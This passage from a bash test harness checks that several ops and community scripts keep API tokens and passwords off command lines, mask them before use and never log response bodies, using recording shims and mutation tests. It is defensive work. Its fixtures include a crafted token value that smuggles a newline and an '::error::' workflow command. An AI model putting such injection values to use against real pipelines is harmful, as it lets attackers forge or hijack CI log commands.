   && grep -qxF -- "header = \"Authorization: Bot $FIXTURE_TOKEN\"" "$RUN_ROW/shim/calls/1.stdin"; then
  row "scheme: a Bot probe sends exactly the line header = \"Authorization: Bot <tok>\" on stdin and is GREEN under the Bot-aware shim" ok
else row "scheme: a Bot probe sends exactly the line header = \"Authorization: Bot <tok>\" on stdin and is GREEN under the Bot-aware shim" fail "rc=$rc failed='$EV_FAILED'"; fi
P_BOT_AS_BEARER="$SYN/synth-bot-as-bearer.sh"; sed 's/Authorization: Bot /Authorization: Bearer /' "$P_BOT" > "$P_BOT_AS_BEARER"
grep -q 'Authorization: Bearer' "$P_BOT_AS_BEARER" || fatal "scheme mutation did not land"
run_probe s2-bearer "$P_BOT_AS_BEARER" "SYNTH_TOKEN=$FIXTURE_TOKEN" SHIM_SCHEME=Bot
rc=$RUN_RC; evaluate "$RUN_ROW" "$SYN_HOST" 1 "$FIXTURE_TOKEN" Bot
if has_check bearer-not-on-stdin && transient_outcome "$RUN_ROW" "$rc"; then
  row "scheme: swapping Bot for Bearer is RED (the exact-line check fires, and the Bot-aware shim answers 401, never PASS)" ok
else row "scheme: swapping Bot for Bearer is RED (the exact-line check fires, and the Bot-aware shim answers 401, never PASS)" fail "rc=$rc failed='$EV_FAILED'"; fi
evaluate "$ROWS/s1-bot" "$SYN_HOST" 1 "$FIXTURE_TOKEN"
if has_check bearer-not-on-stdin; then row "scheme: evaluating the Bot probe as a Bearer probe is RED (the default scheme did not loosen)" ok
else row "scheme: evaluating the Bot probe as a Bearer probe is RED (the default scheme did not loosen)" fail "failed='$EV_FAILED'"; fi
run_probe s3-bot-default-shim "$P_BOT" "SYNTH_TOKEN=$FIXTURE_TOKEN"
if transient_outcome "$RUN_ROW" "$RUN_RC"; then row "scheme: a default (Bearer) shim rejects a Bot probe with 401, TRANSIENT (the auth gate is scheme-aware)" ok
else row "scheme: a default (Bearer) shim rejects a Bot probe with 401, TRANSIENT (the auth gate is scheme-aware)" fail "rc=$RUN_RC"; fi

# (b)+(c) stdin-body rows ----------------------------------------------------------------
make_body_probe() { # <variant: stdin|dstdin|argv|jqarg> -> path
  local v="$1" p="$SYN/synth-body-$1.sh"
  {
    cat <<'EOF'
#!/usr/bin/env bash
set -uo pipefail
case "$-" in
  *x*)
    if [ -n "${SYNTH_PW:+x}" ]; then
      printf '[FATAL] refusing to run under xtrace with a live credential set (SYNTH_PW).\n' >&2
      exit 78
    fi
    ;;
esac
EOF
    # The body is built by jq and piped to curl's STDIN: no file, no trap. The values reach jq only
    # through its environment (an inline assignment prefix), never `jq --arg` and never `export`.
    case "$1" in
      stdin) printf '%s\n' "RESP=\$(SYNTH_ID_E=\"\$SYNTH_ID\" SYNTH_PW_E=\"\$SYNTH_PW\" jq -n '{identifier:\$ENV.SYNTH_ID_E,password:\$ENV.SYNTH_PW_E}' | curl --disable --noproxy '*' -sS -w '\\nHTTP_STATUS:%{http_code}' -X POST -H 'Content-Type: application/json' --data-binary @- '$SYN_URL')" ;;
      jqarg) printf '%s\n' "RESP=\$(jq -n --arg id \"\$SYNTH_ID\" --arg pw \"\$SYNTH_PW\" '{identifier:\$id,password:\$pw}' | curl --disable --noproxy '*' -sS -w '\\nHTTP_STATUS:%{http_code}' -X POST -H 'Content-Type: application/json' --data-binary @- '$SYN_URL')" ;;
      dstdin) printf '%s\n' "RESP=\$(SYNTH_ID_E=\"\$SYNTH_ID\" SYNTH_PW_E=\"\$SYNTH_PW\" jq -n '{identifier:\$ENV.SYNTH_ID_E,password:\$ENV.SYNTH_PW_E}' | curl --disable --noproxy '*' -sS -w '\\nHTTP_STATUS:%{http_code}' -X POST -H 'Content-Type: application/json' -d @- '$SYN_URL')" ;;
      argv) printf '%s\n' "RESP=\$(curl --disable --noproxy '*' -sS -w '\\nHTTP_STATUS:%{http_code}' -X POST -H 'Content-Type: application/json' -d \"{\\\"identifier\\\":\\\"\$SYNTH_ID\\\",\\\"password\\\":\\\"\$SYNTH_PW\\\"}\" '$SYN_URL')" ;;
    esac
    synth_tail
  } > "$p"
  printf '%s\n' "$p"
}
BODY_PW="SYNTHPW""-aaaa-bbbb-cccc"
BODY_ID="synthetic.bsky.social"
evaluate_body() { # <rowdir> -> EV_FAILED names: pw-in-argv, pw-in-jq-argv, body-not-recorded, body-content, no-calls
  local row="$1" f c
  EV_FAILED=""; count_calls "$row"
  [[ "$EV_CALLS" -ge 1 ]] || EV_FAILED+=" no-calls"
  for f in "$row"/shim/calls/*.argv; do
    [[ -e "$f" ]] || continue
    c="${f%.argv}"
    grep -aqF -- "$BODY_PW" "$f" && EV_FAILED+=" pw-in-argv"
    [[ -s "$c.body" ]] || EV_FAILED+=" body-not-recorded"
    jq -e --arg i "$BODY_ID" --arg p "$BODY_PW" '.identifier == $i and .password == $p' "$c.body" >/dev/null 2>&1 || EV_FAILED+=" body-content"
  done
  for f in "$row"/shim/jq/*.argv; do
    [[ -e "$f" ]] || continue
    grep -aqF -- "$BODY_PW" "$f" && EV_FAILED+=" pw-in-jq-argv"
  done
  EV_FAILED="$(printf '%s\n' $EV_FAILED | awk '!s[$0]++' | paste -sd' ' -)"
  return 0
}
body_env=("SYNTH_PW=$BODY_PW" "SYNTH_ID=$BODY_ID" SHIM_MODE=noauth)

P_BS="$(make_body_probe stdin)"
run_probe b1-stdin "$P_BS" "${body_env[@]}"
rc=$RUN_RC; evaluate_body "$RUN_ROW"
if [[ "$rc" -eq 0 && -z "$EV_FAILED" ]] && grep -q '^PASS' "$RUN_ROW/stdout"; then
  row "body: a jq-to-curl --data-binary @- probe is GREEN (exact stdin body, password in no curl or jq argv)" ok
else row "body: a jq-to-curl --data-binary @- probe is GREEN (exact stdin body, password in no curl or jq argv)" fail "rc=$rc failed='$EV_FAILED' pass-line=$(grep -c '^PASS' "$RUN_ROW/stdout" || true)"; fi
if [[ -s "$ROWS/b1-stdin/shim/jq/counter" ]] && grep -aqF 'ENV.SYNTH_PW_E' "$ROWS/b1-stdin/shim/jq/1.argv"; then
  row "jq shim: records jq's argv (the body writer's program text is on file; recording works)" ok
else row "jq shim: records jq's argv (the body writer's program text is on file; recording works)" fail "no jq argv recorded"; fi

P_BA="$(make_body_probe argv)"
run_probe b2-argv "$P_BA" "${body_env[@]}"
evaluate_body "$RUN_ROW"
if has_check pw-in-argv; then row "body: handing the password to curl as -d \"\$body\" is RED on pw-in-argv" ok
else row "body: handing the password to curl as -d \"\$body\" is RED on pw-in-argv" fail "failed='$EV_FAILED'"; fi

P_BJ="$(make_body_probe jqarg)"
run_probe b3-jqarg "$P_BJ" "${body_env[@]}"
evaluate_body "$RUN_ROW"
if has_check pw-in-jq-argv && ! has_check pw-in-argv; then
  row "body: passing the password to jq as --arg is RED on pw-in-jq-argv, which the curl shim alone cannot see" ok
else row "body: passing the password to jq as --arg is RED on pw-in-jq-argv, which the curl shim alone cannot see" fail "failed='$EV_FAILED'"; fi

run_probe b4-nobody "$P_BS" "${body_env[@]}" SHIM_MUTATE=nobody
evaluate_body "$RUN_ROW"
if has_check body-not-recorded && has_check body-content; then row "body: a shim that stops recording the stdin body turns the body rows RED" ok
else row "body: a shim that stops recording the stdin body turns the body rows RED" fail "failed='$EV_FAILED'"; fi

P_BD="$(make_body_probe dstdin)"
run_probe b5-dstdin "$P_BD" "${body_env[@]}"
nl_bin="$(wc -l < "$ROWS/b1-stdin/shim/calls/1.body")"; nl_d="$(wc -l < "$ROWS/b5-dstdin/shim/calls/1.body")"
if [[ "$nl_bin" -ge 2 && "$nl_d" -eq 0 ]]; then
  row "body: the shim keeps CR/LF for --data-binary @- and strips them for -d @- on stdin, as real curl does (control C4)" ok
else row "body: the shim keeps CR/LF for --data-binary @- and strips them for -d @- on stdin, as real curl does (control C4)" fail "binary-lines=$nl_bin d-lines=$nl_d"; fi

# fail7: the transport-failure mode, calibrated to real curl's exit 7 by control C4.
run_probe b6-fail7 "$P_CANON" "SYNTH_TOKEN=$FIXTURE_TOKEN" SHIM_MODE=fail7
count_calls "$RUN_ROW"
if [[ "$RUN_RC" -eq 7 && "$EV_CALLS" -eq 1 ]] && ! grep -q '^PASS' "$RUN_ROW/stdout" && grep -q 'TRANSIENT' "$RUN_ROW/stderr"; then
  row "fail7: a transport failure (curl exit 7) reaches the probe's TRANSIENT path with the call recorded, never PASS" ok
else row "fail7: a transport failure (curl exit 7) reaches the probe's TRANSIENT path with the call recorded, never PASS" fail "rc=$RUN_RC calls=$EV_CALLS"; fi

# (d) static rows over the converted sources and docs. `git grep` reads TRACKED files by default: on an
# uncommitted tree a new file is invisible, so the helper searches untracked files too (--untracked) and
# requires every operand to exist. It passes ONLY on `git grep -q` rc 1 (no match): rc 128 (not a repo, as
# in a mutation sandbox; a bad pathspec) and rc 0 (a match) are both failures, so `! git grep` can no
# longer pass vacuously.
static_absent() { # <ere> <file...>
  local ere="$1" f rc=0; shift
  for f in "$@"; do [[ -f "$f" ]] || return 1; done
  git grep -q --untracked -E -e "$ere" -- "$@" >/dev/null 2>&1 || rc=$?
  [[ "$rc" -eq 1 ]]
}
# The two production regexes, named so the fixture rows below run the SAME text the real rows do.
ERE_DISCORD_ARGV='-H +"Authorization: *Bot'
ERE_BSKY_PW_ARGV='(-d|--data[a-z-]*)[ =]+"([^"\\]|\\.)*\$\{?BSKY_(APP_PASSWORD|PW)|--arg +[a-z_]+ +"\$\{?BSKY_(APP_PASSWORD|PW)'
COMM="plugins/soleur/skills/community/scripts"
SETUP_MD="plugins/soleur/skills/flag-bootstrap/SETUP.md"
n_apikey_argv="$(grep -cE -e '-H +"?Authorization: *Api-Key' "$SETUP_MD" || true)"
n_apikey_cfg="$(grep -cF 'header = "Authorization: Api-Key %s"' "$SETUP_MD" || true)"
if [[ "$n_apikey_argv" -eq 0 && "$n_apikey_cfg" -ge 5 ]]; then
  row "static: flag-bootstrap/SETUP.md has no -H Authorization: Api-Key curl example left and carries five stdin-config forms" ok
else row "static: flag-bootstrap/SETUP.md has no -H Authorization: Api-Key curl example left and carries five stdin-config forms" fail "argv=$n_apikey_argv stdin-config=$n_apikey_cfg"; fi
if static_absent "$ERE_DISCORD_ARGV" "$COMM/discord-community.sh" "$COMM/discord-setup.sh" \
   && grep -qF 'header = "Authorization: Bot %s"' "$COMM/discord-community.sh" "$COMM/discord-setup.sh"; then
  row "static: neither Discord script carries a -H \"Authorization: Bot ...\" argument (array-held or inline), both build the stdin config line" ok
else row "static: neither Discord script carries a -H \"Authorization: Bot ...\" argument (array-held or inline), both build the stdin config line" fail "an argv Bot header is back, or the stdin config line is gone"; fi
# A password variable inside a -d/--data* operand or a jq --arg of the two bsky scripts (lint equality says
# nothing about a body: it is not a header, so these two files are not in baseline E). The stdin form is
# asserted on its behaviour (a `--data-binary @-` body, the values read from jq's environment), not on how
# the body is assembled.
if static_absent "$ERE_BSKY_PW_ARGV" "$COMM/bsky-community.sh" "$COMM/bsky-setup.sh" \
   && [[ "$(grep -c -F -e '--data-binary @-' "$COMM/bsky-community.sh" "$COMM/bsky-setup.sh" | awk -F: '{s+=$2} END {print s}')" -ge 2 ]] \
   && [[ "$(grep -c -F -e '$ENV.BSKY_PW' "$COMM/bsky-community.sh" "$COMM/bsky-setup.sh" | awk -F: '{s+=$2} END {print s}')" -ge 2 ]]; then
  row "static: neither bsky script puts the app password in a -d/--data operand or a jq --arg, both send the body to curl on stdin (--data-binary @-) with the values read from jq's environment" ok
else row "static: neither bsky script puts the app password in a -d/--data operand or a jq --arg, both send the body to curl on stdin (--data-binary @-) with the values read from jq's environment" fail "the password is back on an argv, or the stdin form is gone"; fi

# `static_absent` ITSELF is proven here, on fixtures, in both directions. Its "absent" half is otherwise a
# dead assertion (a body of `true`, or accepting git's rc 128, would leave every row above green).
SAR="$TMPD/sa-repo"; SAN="$TMPD/sa-nogit"
for d in "$SAR" "$SAN"; do assert_fixture_dir "$d"; mkdir -p "$d"; done
( source "$REPO_ROOT/plugins/soleur/test/lib/git-fixture-env.sh" && git_fixture_env "$SAR" || exit 1; git -C "$SAR" init -q ) || { echo "FATAL: the static_absent fixture repo could not be created" >&2; exit 2; }
printf '%s\n' 'echo clean' > "$SAR/clean.sh"
printf '%s\n' 'echo clean' > "$SAN/clean.sh"
# Each violating fixture is one line the matching production regex must flag.
printf '%s\n' 'curl -H "Authorization: Bot $TOKEN" "$URL"' > "$SAR/viol-discord.sh"
printf '%s\n' 'curl -d "{\"password\":\"${BSKY_APP_PASSWORD}\"}" "$URL"' > "$SAR/viol-bsky-d.sh"
printf '%s\n' 'curl --data "x=${BSKY_PW}" "$URL"' > "$SAR/viol-bsky-data.sh"
printf '%s\n' 'jq -n --arg pw "$BSKY_PW" "{password:\$pw}"' > "$SAR/viol-bsky-arg.sh"
# The compliant bsky shape (env-read jq program, stdin body) must NOT be flagged.
printf '%s\n' "jq -n '{password: \$ENV.BSKY_PW}' | curl --data-binary @- \"\$URL\"" > "$SAR/ok-bsky.sh"
sa_in_repo() { ( cd "$SAR" && static_absent "$@" ); }
sa_in_nogit() { ( cd "$SAN" && GIT_CEILING_DIRECTORIES="$TMPD" static_absent "$@" ); }

if sa_in_repo "$ERE_DISCORD_ARGV" clean.sh && sa_in_repo "$ERE_BSKY_PW_ARGV" clean.sh ok-bsky.sh; then
  row "static_absent: a clean file and the compliant bsky shape are absent (true) in a repository" ok
else row "static_absent: a clean file and the compliant bsky shape are absent (true) in a repository" fail "a clean fixture was flagged"; fi
sa_bad=""
sa_in_repo "$ERE_DISCORD_ARGV" viol-discord.sh && sa_bad+=" discord"
for v in viol-bsky-d.sh viol-bsky-data.sh viol-bsky-arg.sh; do sa_in_repo "$ERE_BSKY_PW_ARGV" "$v" && sa_bad+=" $v"; done
if [[ -z "$sa_bad" ]]; then row "static_absent: a violating fixture is NOT absent (false) for the Discord regex and for each bsky regex alternative (-d, --data, --arg)" ok
else row "static_absent: a violating fixture is NOT absent (false) for the Discord regex and for each bsky regex alternative (-d, --data, --arg)" fail "passed vacuously on:$sa_bad"; fi
if ! sa_in_repo "$ERE_DISCORD_ARGV" clean.sh no-such-file.sh; then row "static_absent: a missing operand is a refusal (false), not a pass" ok
else row "static_absent: a missing operand is a refusal (false), not a pass" fail "a missing file read as absent"; fi
# rc 128 (git could not search) is a refusal: once for a directory that is not a repository, once for an
# unusable regex inside a good repository.
if ! sa_in_nogit "$ERE_DISCORD_ARGV" clean.sh; then row "static_absent: git rc 128 (not a repository) is a refusal (false), not a pass" ok
else row "static_absent: git rc 128 (not a repository) is a refusal (false), not a pass" fail "rc 128 read as absent"; fi
if ! sa_in_repo '(' clean.sh; then row "static_absent: git rc 128 (unusable regex) is a refusal (false), not a pass" ok
else row "static_absent: git rc 128 (unusable regex) is a refusal (false), not a pass" fail "rc 128 read as absent"; fi
echo "=== stage 4: shim extensions (scheme, stdin body, fail7, jq shim, static rows) done ==="

# =====================================================================================
# STAGE S2-A (argv-bearer sweep S2, plan 2026-10-08-fix-argv-bearer-sweep-s2-ops-runner-scripts):
# scripts/cutover-inngest.sh. Part 1 = the `backup)` arm (#8767): the Doppler-read Hetzner token is
# shape-checked, then masked BEFORE its first use, and no response body ever reaches the run log.
# The arm is EXTRACTED from the real script (never re-typed here) and run under a recording `curl`
# and a `doppler` that returns a synthetic canary. The driver runs with stdout and stderr in ONE file
# so the ORDER of events (mask line, then the first curl call) is observable.
# =====================================================================================
CUT="scripts/cutover-inngest.sh"
[[ -f "$CUT" ]] || fatal "stage S2-A: $CUT is missing"
BKBIN="$TMPD/bkbin"; BKDIR="$TMPD/bk"
for d in "$BKBIN" "$BKDIR"; do assert_fixture_dir "$d"; mkdir -p "$d"; done
ln -s "$(type -P seq)" "$BKBIN/seq"
printf '#!%s\nprintf "%%s\\n" "$BK_TOKEN"\n' "$BASH_BIN" > "$BKBIN/doppler"
cat > "$BKBIN/curl" <<'BK_CURL_EOF'
#!/usr/bin/env bash
# Recording curl for the backup-arm rows. Records argv (NUL-delimited) and, for `--config -`, stdin.
# Announces each call on STDERR (SHIMCALL n) so the combined stream orders it against the mask line.
set -u
D="${BK_SHIM:?}"; mkdir -p "$D/calls"
n=0; [[ -r "$D/counter" ]] && read -r n < "$D/counter"
n=$((n + 1)); printf '%s\n' "$n" > "$D/counter"
printf '%s\0' "$@" > "$D/calls/$n.argv"
printf 'SHIMCALL %s\n' "$n" >&2
out=""; wfmt=""; url=""; cfg=0; a=("$@"); i=0
while (( i < ${#a[@]} )); do
  case "${a[i]}" in
    -o) out="${a[i+1]}"; i=$((i + 1)) ;;
    -w) wfmt="${a[i+1]}"; i=$((i + 1)) ;;
    --config) [[ "${a[i+1]}" == "-" ]] && cfg=1; i=$((i + 1)) ;;
    -H) [[ "${a[i+1]}" == "@-" ]] && cfg=1; i=$((i + 1)) ;;
    http*) url="${a[i]}" ;;
  esac
  i=$((i + 1))
done
(( cfg )) && cat > "$D/calls/$n.stdin"
case "$url" in
  *create_image) st="${BK_CREATE_STATUS:-201}"; bodyf="${BK_CREATE_BODY:-}" ;;
  *) st="${BK_HTTP_STATUS:-200}"; bodyf="${BK_ACTION_BODY:-}" ;;
esac
[[ "$st" == 000 ]] && { printf 'curl: (7) Failed to connect\n' >&2; exit 7; }
[[ -n "$out" && -n "$bodyf" ]] && cp "$bodyf" "$out"
[[ "$wfmt" == '%{http_code}' ]] && printf '%s' "$st"
[[ "$wfmt" == '\n%{http_code}' ]] && printf '\n%s' "$st"
exit 0
BK_CURL_EOF
chmod +x "$BKBIN/doppler" "$BKBIN/curl"

# bk_driver <outfile> <script>: _bearer_ok + _bearer_curl + the backup arm, /tmp/backup-* rewritten to
# ${BK_TMP}/backup-* so a row never touches the real /tmp. A positive control below proves the arm ran.
bk_driver() {
  local out="$1" src="$2"
  assert_fixture_dir "$out"
  {
    printf 'set -euo pipefail\n'
    grep -m1 '^_bearer_ok() {' "$src"
    awk '/^_bearer_curl\(\) \{$/,/^}$/' "$src"
    printf 'case backup in\n'
    awk '/^  backup\)$/{f=1} f{print} f&&/^    ;;$/{exit}' "$src" | sed 's|/tmp/backup-|${BK_TMP}/backup-|g'
    printf 'esac\n'
  } > "$out"
}
BKDRV="$BKDIR/driver.sh"
bk_driver "$BKDRV" "$CUT"
printf '%s' '{"image":{"id":111},"action":{"id":222}}' > "$BKDIR/create-ok.json"
printf '%s' '{"action":{"id":222,"status":"success"}}' > "$BKDIR/action-success.json"
BK_CANARY="hcloud-canary-$(od -An -N8 -tx1 /dev/urandom | tr -d ' \n')"
BK_BODYCANARY="bodycanary-$(od -An -N8 -tx1 /dev/urandom | tr -d ' \n')"
printf '{"error":{"code":"forbidden","message":"%s"}}' "$BK_BODYCANARY" > "$BKDIR/create-err.json"
printf '{"action":{"id":222,"status":"error","error":{"code":"x","message":"%s"}}}' "$BK_BODYCANARY" > "$BKDIR/action-error.json"

BK_RC=0
bk_run() { # <rowname> <token> <create_status> <create_body_file> <action_body_file> [driver]
  local name="$1" row="$ROWS/$1" drv="${6:-$BKDRV}"
  assert_fixture_dir "$row"; mkdir -p "$row/tmp" "$row/home" "$row/shim"
  ( cd "$row" && env -i PATH="$BKBIN:$REALBIN" HOME="$row/home" TMPDIR="$row/tmp" BK_TMP="$row/tmp" BK_SHIM="$row/shim" \
      BK_TOKEN="$2" BK_CREATE_STATUS="$3" BK_CREATE_BODY="$4" BK_ACTION_BODY="$5" \
      "$BASH_BIN" "$drv" < /dev/null > "$row/out" 2>&1 )
  BK_RC=$?
}
bk_count() { local n; n="$(grep -cF -- "$2" "$1" 2>/dev/null || true)"; printf '%s' "${n:-0}"; }
bk_calls() { local n=0 f; for f in "$1"/shim/calls/*.argv; do [[ -e "$f" ]] && n=$((n + 1)); done; printf '%s' "$n"; }
# Invariants for a run that reached the Hetzner API: sets BK_FAIL (space-separated check names, empty = green).
#   mask-not-first   the first output line is not exactly `::add-mask::<token>`
#   mask-count       the token appears on a number of lines other than exactly one
#   mask-after-curl  the first curl call is announced before the mask line
#   token-in-argv    the token is in any recorded curl argv
#   token-not-stdin  the first curl call's stdin lacks the bearer header
#   body-in-output   the response-body canary reached the output
bk_check() { # <rowname> <token>
  local row="$ROWS/$1" tok="$2" first mline cline
  BK_FAIL=""
  first="$(head -n1 "$row/out")"
  [[ "$first" == "::add-mask::$tok" ]] || BK_FAIL+=" mask-not-first"
  [[ "$(bk_count "$row/out" "$tok")" == 1 ]] || BK_FAIL+=" mask-count"
  mline="$(grep -nFx -m1 -- "::add-mask::$tok" "$row/out" | cut -d: -f1)"
  cline="$(grep -n -m1 '^SHIMCALL ' "$row/out" | cut -d: -f1)"
  [[ -n "$mline" && -n "$cline" && "$mline" -lt "$cline" ]] || BK_FAIL+=" mask-after-curl"
  local f; for f in "$row"/shim/calls/*.argv; do [[ -e "$f" ]] && grep -aqF -- "$tok" "$f" && BK_FAIL+=" token-in-argv"; done
  grep -qxF -- "header = \"Authorization: Bearer $tok\"" "$row/shim/calls/1.stdin" 2>/dev/null || BK_FAIL+=" token-not-stdin"
  [[ "$(bk_count "$row/out" "$BK_BODYCANARY")" == 0 ]] || BK_FAIL+=" body-in-output"
  BK_FAIL="$(printf '%s\n' $BK_FAIL | awk '!s[$0]++' | paste -sd' ' -)"
}

# Positive control: the extracted driver really runs the arm (two curl calls on the 201 path: create + one poll).
bk_run bk-201 "$BK_CANARY" 201 "$BKDIR/create-ok.json" "$BKDIR/action-success.json"
bk_check bk-201 "$BK_CANARY"
if [[ "$(grep -c '_bearer_curl HCLOUD_TOKEN' "$BKDRV")" -ge 2 && "$BK_RC" -eq 0 && "$(bk_calls "$ROWS/bk-201")" == 2 ]] \
   && grep -qF 'backup image id=111 ready' "$ROWS/bk-201/out"; then
  row "backup arm extraction control: the extracted arm runs under the shims (rc 0, create + one poll, image id reported)" ok
else row "backup arm extraction control: the extracted arm runs under the shims (rc 0, create + one poll, image id reported)" fail "rc=$BK_RC calls=$(bk_calls "$ROWS/bk-201")"; fi
if [[ -z "$BK_FAIL" ]]; then
  row "backup arm 201: the mask line is the first output event, appears once, before any curl call; the token is on curl's stdin and in no argv" ok
else row "backup arm 201: the mask line is the first output event, appears once, before any curl call; the token is on curl's stdin and in no argv" fail "checks: $BK_FAIL"; fi

# non-201: exit 1, the code and a fixed class hint, never the body; mask still first and once.
bk_run bk-403 "$BK_CANARY" 403 "$BKDIR/create-err.json" "$BKDIR/action-success.json"
bk_check bk-403 "$BK_CANARY"
n_err="$(bk_count "$ROWS/bk-403/out" '::error::')"
if [[ "$BK_RC" -eq 1 && -z "$BK_FAIL" && "$n_err" == 1 ]] && grep -qF 'HTTP 403' "$ROWS/bk-403/out" \
   && grep -qF 'ADR-241 D4' "$ROWS/bk-403/out" && [[ "$(bk_calls "$ROWS/bk-403")" == 1 ]]; then
  row "backup arm 403: exit 1 with the HTTP code and the ADR-241 D4 class hint, one ::error:: line, the response body canary absent, no poll" ok
else row "backup arm 403: exit 1 with the HTTP code and the ADR-241 D4 class hint, one ::error:: line, the response body canary absent, no poll" fail "rc=$BK_RC errlines=$n_err checks: $BK_FAIL"; fi
bk_run bk-500 "$BK_CANARY" 500 "$BKDIR/create-err.json" "$BKDIR/action-success.json"
bk_check bk-500 "$BK_CANARY"
if [[ "$BK_RC" -eq 1 && -z "$BK_FAIL" ]] && grep -qF 'HTTP 500' "$ROWS/bk-500/out"; then
  row "backup arm 500: exit 1 with the HTTP code only, the response body canary absent" ok
else row "backup arm 500: exit 1 with the HTTP code only, the response body canary absent" fail "rc=$BK_RC checks: $BK_FAIL"; fi
bk_run bk-000 "$BK_CANARY" 000 "$BKDIR/create-err.json" "$BKDIR/action-success.json"
if [[ "$BK_RC" -eq 1 ]] && grep -qF 'HTTP 000' "$ROWS/bk-000/out" && [[ "$(bk_count "$ROWS/bk-000/out" "$BK_BODYCANARY")" == 0 ]] \
   && [[ "$(bk_count "$ROWS/bk-000/out" "$BK_CANARY")" == 1 ]]; then
  row "backup arm transport failure (curl exit 7): exit 1 reporting HTTP 000, the token only on the mask line" ok
else row "backup arm transport failure (curl exit 7): exit 1 reporting HTTP 000, the token only on the mask line" fail "rc=$BK_RC"; fi

# action error: the id is printed, the action document (it carries error text) never is.
bk_run bk-actionerr "$BK_CANARY" 201 "$BKDIR/create-ok.json" "$BKDIR/action-error.json"
bk_check bk-actionerr "$BK_CANARY"
if [[ "$BK_RC" -eq 1 && -z "$BK_FAIL" ]] && grep -qF 'action 222 failed' "$ROWS/bk-actionerr/out"; then
  row "backup arm action error: exit 1 naming the action id, the action document (response body canary) absent from output" ok
else row "backup arm action error: exit 1 naming the action id, the action document (response body canary) absent from output" fail "rc=$BK_RC checks: $BK_FAIL"; fi

# hostile / empty Doppler value: refused before the mask and before any request; the value never appears.
BK_HOSTILE=$'abc\n::error::injected-'"$BK_CANARY"
for hv in "newline-and-workflow-command:$BK_HOSTILE" "space:abc def-$BK_CANARY" "quote:abc\"def-$BK_CANARY" "empty:"; do
  hname="${hv%%:*}"; hval="${hv#*:}"
  bk_run "bk-hostile-$hname" "$hval" 201 "$BKDIR/create-ok.json" "$BKDIR/action-success.json"
  hbad=""
  [[ "$BK_RC" -eq 1 ]] || hbad+=" rc=$BK_RC"
  [[ "$(bk_calls "$ROWS/bk-hostile-$hname")" == 0 ]] || hbad+=" curl-called"
  [[ "$(bk_count "$ROWS/bk-hostile-$hname/out" '::add-mask::')" == 0 ]] || hbad+=" mask-printed"
  [[ "$(bk_count "$ROWS/bk-hostile-$hname/out" "$BK_CANARY")" == 0 ]] || hbad+=" value-in-output"
  [[ "$(bk_count "$ROWS/bk-hostile-$hname/out" 'SOLEUR_CREDENTIAL_REFUSED script=cutover-inngest reason=token_shape')" == 1 ]] || hbad+=" no-marker"
  if [[ -z "$hbad" ]]; then row "backup arm refuses a $hname Doppler value before the mask and before any request (rc 1, zero curl calls, one value-free marker)" ok
  else row "backup arm refuses a $hname Doppler value before the mask and before any request (rc 1, zero curl calls, one value-free marker)" fail "$hbad"; fi
done

# static rows over the real script (pattern compile pre-check first: grep rc 2 must not read as "absent").
BK_ARM="$BKDIR/arm.txt"
awk '/^  backup\)$/{f=1} f{print} f&&/^    ;;$/{exit}' "$CUT" > "$BK_ARM"
ERE_BK_ERRCAT='::error::[^"]*\$\(cat /tmp/backup-'; ERE_BK_CAT='cat /tmp/backup-(action|body)'
bk_pre=0
for ere in "$ERE_BK_ERRCAT" "$ERE_BK_CAT"; do grep -E -e "$ere" /dev/null >/dev/null 2>&1; [[ $? -eq 1 ]] || bk_pre=1; done
n_bodycat="$(grep -cE -e "$ERE_BK_ERRCAT" "$BK_ARM" || true)"
n_actioncat="$(grep -cE -e "$ERE_BK_CAT" "$BK_ARM" || true)"
if [[ "$bk_pre" -eq 0 && "$n_bodycat" == 0 && "$n_actioncat" == 0 ]]; then
  row "static: no cat of the backup body or action document remains in the backup arm (no \$(cat /tmp/backup- in any ::error:: line)" ok
else row "static: no cat of the backup body or action document remains in the backup arm (no \$(cat /tmp/backup- in any ::error:: line)" fail "pre=$bk_pre error-cat=$n_bodycat cat=$n_actioncat"; fi
mask_ln="$(grep -n -m1 "add-mask::" "$BK_ARM" | cut -d: -f1)"
curl_ln="$(grep -n -m1 '_bearer_curl HCLOUD_TOKEN' "$BK_ARM" | cut -d: -f1)"
shape_ln="$(grep -n -m1 '_bearer_ok "\$HCLOUD_TOKEN"' "$BK_ARM" | cut -d: -f1)"
if [[ -n "$mask_ln" && -n "$curl_ln" && -n "$shape_ln" && "$shape_ln" -lt "$mask_ln" && "$mask_ln" -lt "$curl_ln" ]]; then
  row "static: in the backup arm the shape check precedes the ::add-mask:: line, which precedes the first _bearer_curl HCLOUD_TOKEN" ok
else row "static: in the backup arm the shape check precedes the ::add-mask:: line, which precedes the first _bearer_curl HCLOUD_TOKEN" fail "shape=$shape_ln mask=$mask_ln curl=$curl_ln"; fi
# MUTATIONS of the extracted driver (one literal per mutant; mutated_copy is FATAL when the literal is absent). Each
# must turn the named check RED, so the rows above are proven able to fail and not merely observed green.
bk_mut() { # <mutant> <from> <to> [<from2> <to2>] -> $BKDIR/mut-<mutant>.sh
  local out="$BKDIR/mut-$1.sh"
  mutated_copy "$BKDRV" "$out" "$2" "$3"
  [[ -n "${4:-}" ]] && mutated_copy "$out" "$out.2" "$4" "$5" && mv "$out.2" "$out"
  printf '%s' "$out"
}
BK_MASK_LINE='printf '"'"'::add-mask::%s\n'"'"' "$HCLOUD_TOKEN" >&2'
m="$(bk_mut nomask "$BK_MASK_LINE" ':')"
bk_run bk-mut-nomask "$BK_CANARY" 201 "$BKDIR/create-ok.json" "$BKDIR/action-success.json" "$m"; bk_check bk-mut-nomask "$BK_CANARY"
if [[ " $BK_FAIL " == *" mask-not-first "* && " $BK_FAIL " == *" mask-count "* ]]; then row "mutation: the mask line removed turns the 201 row RED (mask-not-first, mask-count)" ok
else row "mutation: the mask line removed turns the 201 row RED (mask-not-first, mask-count)" fail "checks: $BK_FAIL"; fi
m="$(bk_mut maskafter "$BK_MASK_LINE" ':' 'IMAGE_ID=$(jq' "$BK_MASK_LINE"$'\n    IMAGE_ID=$(jq')"
bk_run bk-mut-maskafter "$BK_CANARY" 201 "$BKDIR/create-ok.json" "$BKDIR/action-success.json" "$m"; bk_check bk-mut-maskafter "$BK_CANARY"
if [[ " $BK_FAIL " == *" mask-after-curl "* && " $BK_FAIL " == *" mask-not-first "* ]]; then row "mutation: the mask line moved after the first curl call turns the 201 row RED (mask-after-curl)" ok
else row "mutation: the mask line moved after the first curl call turns the 201 row RED (mask-after-curl)" fail "checks: $BK_FAIL"; fi
m="$(bk_mut bodyecho 'if [[ "$CODE" != "201" ]]; then' 'if [[ "$CODE" != "201" ]]; then echo "::error::body: $(cat ${BK_TMP}/backup-body 2>/dev/null)";')"
